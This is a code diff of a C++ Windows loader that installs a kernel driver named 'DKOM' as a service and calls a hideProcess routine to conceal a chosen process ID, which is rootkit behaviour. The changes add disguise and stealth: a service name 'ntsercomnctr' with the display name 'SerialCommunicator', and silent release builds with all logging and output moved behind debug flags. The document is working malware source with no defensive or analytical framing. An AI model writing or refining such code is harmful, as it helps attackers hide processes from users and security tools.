@@ -10,12 +10,14 @@ namespace Logs
 	Log* log;
 }
 
-bool loadSysFileSCM(char* driverName, char* displayName);
 bool cmdLoadSysFile(char* driverName, char* displayName);
-bool tryLoadSysFile(char* driverName, char* displayName);
+bool loadSysFileSCM(char* driverName, char* displayName, char* serviceName);
+bool tryLoadSysFile(char* driverName, char* displayName, char* serviceName);
 bool hideProcess(char* driverName, int pid);
 
-#if defined _DEBUG || defined TRUE
+#pragma region defines
+
+#ifdef _DEBUG
 #define DEBUG
 #endif
 
@@ -33,17 +35,24 @@ bool hideProcess(char* driverName, int pid);
 #define loadSysFile cmdLoadSysFile
 #endif
 
+#pragma endregion
+
 int main(int argc, char *argv[])
 {
+#ifdef DEBUG
 	Logs::log = new Log();
 	Logs::log->WriteLine("\n\nstarted...\n");
+#endif
 	if (argc < 2)
 	{
+#ifdef DEBUG
 		printf("Not enougth arguments");
-		return 0;
+#endif
+		return -1 ; //failure
 	}
 	char* driverName = "DKOM";
 	char* displayName = "SerialCommunicator"; // friendly name
+	char* serviceName = "ntsercomnctr";
 #ifdef DEBUG
 	char buff[200];
 	sprintf(buff, "sc stop %s", driverName);
@@ -51,19 +60,31 @@ int main(int argc, char *argv[])
 	sprintf(buff, "sc delete %s", driverName);
 	system(buff);
 #endif
-	if (loadSysFile(driverName, displayName) && hideProcess(displayName, atoi(argv[1]))) // atoi = string argument to integer
+#if defined SCM_LOAD || defined TRY_LOAD
+	if (loadSysFile(driverName, displayName, serviceName) && hideProcess(displayName, atoi(argv[1]))) // atoi = (char[]) argument to integer
+#ifdef DEBUG
+		printf("success");
+#else
+		return 0;
+#endif
+#else
+	if (loadSysFile(driverName, displayName) && hideProcess(displayName, atoi(argv[1]))) // atoi = (char[]) argument to integer
 		printf("success\n");
-	else
-		printf("failure\n");
-	char s[100];
-	std::cin >> s;
+#endif
+#ifdef DEBUG
+	printf("failure");
+#else
+	return -1; // failure
+#endif
+	//char s[100];
+	//std::cin >> s;
 
-	return 0;
+	return 0; //success in debug mode
 }
 
 #pragma region loadSysFile
 
-bool loadSysFileSCM(char* driverName, char* displayName) // load manually with scm
+bool loadSysFileSCM(char* driverName, char* displayName, char* serviceName) // load manually with scm
 {
 	printf("loading via SCM\n");
 	Logs::log->WriteLine("loading via SCM");
@@ -72,9 +93,11 @@ bool loadSysFileSCM(char* driverName, char* displayName) // load manually with s
 	SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
 	if (!scmHandle)
 	{
+#ifdef DEBUG
 		sprintf(frmtStr, "failed to open SCM(%d)\n", GetLastError());
 		Logs::log->WriteLine(frmtStr);
 		printf(frmtStr);
+#endif
 		return FALSE;
 	}
 
@@ -82,12 +105,14 @@ bool loadSysFileSCM(char* driverName, char* displayName) // load manually with s
 	GetCurrentDirectory(512, currDir); // get the .sys file location
 	char path[1000];
 	snprintf(path, 998, "%s\\%s.sys", currDir, driverName); // string formatting
+#ifdef DEBUG
 	sprintf(frmtStr, "loading %s\n", path);
 	Logs::log->Write(frmtStr);
 	printf(frmtStr);
+#endif
 	
 	SC_HANDLE driverHandle = CreateService(scmHandle, // Handle to SCManager
-		driverName, // Service Name
+		serviceName, // Service Name
 		displayName, // Display Name
 		SERVICE_ALL_ACCESS, // Desired Access
 		SERVICE_KERNEL_DRIVER, // Service Type
@@ -104,43 +129,54 @@ bool loadSysFileSCM(char* driverName, char* displayName) // load manually with s
 	{
 		if (GetLastError() == ERROR_SERVICE_EXISTS)// || GetLastError() == ERROR_ALREADY_EXISTS)
 		{ // Service exists
+#ifdef DEBUG
 			Logs::log->Write("service exists\n");
 			printf("service exists\n");
+#endif
 			driverHandle = OpenService(scmHandle, driverName, SERVICE_ALL_ACCESS); // get a handle to the existing service handle
 			if (!driverHandle)
 			{
+#ifdef DEBUG
 				sprintf(frmtStr, "couldn't get existing service handle(%d)\n", GetLastError());
 				Logs::log->Write(frmtStr);
 				printf(frmtStr);
+#endif
 				CloseServiceHandle(scmHandle);
 				return FALSE;
 			}
 		}
 		else
 		{
+#ifdef DEBUG
 			sprintf(frmtStr, "couldn't start service(%d)\n", GetLastError());
 			Logs::log->Write(frmtStr);
 			printf(frmtStr);
+#endif
 			CloseServiceHandle(scmHandle);
 			return FALSE;
 		}
 	}
+#ifdef DEBUG
 	sprintf(frmtStr, "driverHandle handled (%d)", driverHandle);
 	Logs::log->WriteLine(frmtStr);
 	printf(frmtStr);
-
+#endif
 	// start the Driver
 	if (0 == StartService(driverHandle, 0, NULL) && GetLastError() != ERROR_SERVICE_ALREADY_RUNNING)
 	{
+#ifdef DEBUG
 		sprintf(frmtStr, "couldn't start driver(%d)\n", GetLastError());
 		Logs::log->Write(frmtStr);
 		printf(frmtStr);
+#endif
 		CloseServiceHandle(scmHandle);
 		CloseServiceHandle(driverHandle);
 		return FALSE;
 	}
+#ifdef DEBUG
 	Logs::log->WriteLine("closing handles");
 	printf("closing handles\n");
+#endif
 	CloseServiceHandle(scmHandle);
 	CloseServiceHandle(driverHandle);
 	return TRUE;
@@ -191,12 +227,12 @@ bool cmdLoadSysFile(char* driverName, char* displayName) // load with cmd comman
 	return TRUE;
 }
 
-bool tryLoadSysFile(char * driverName, char * displayName)
+bool tryLoadSysFile(char * driverName, char * displayName, char* serviceName)
 {
 	//if (loadSysFileSCM(driverName, displayName) || cmdLoadSysFile(driverName, displayName))
 	//	return TRUE;
 	//return FALSE;
-	return loadSysFileSCM(driverName, displayName) || cmdLoadSysFile(driverName, displayName);
+	return loadSysFileSCM(driverName, displayName, serviceName) || cmdLoadSysFile(driverName, displayName);
 }
 
 #pragma endregion
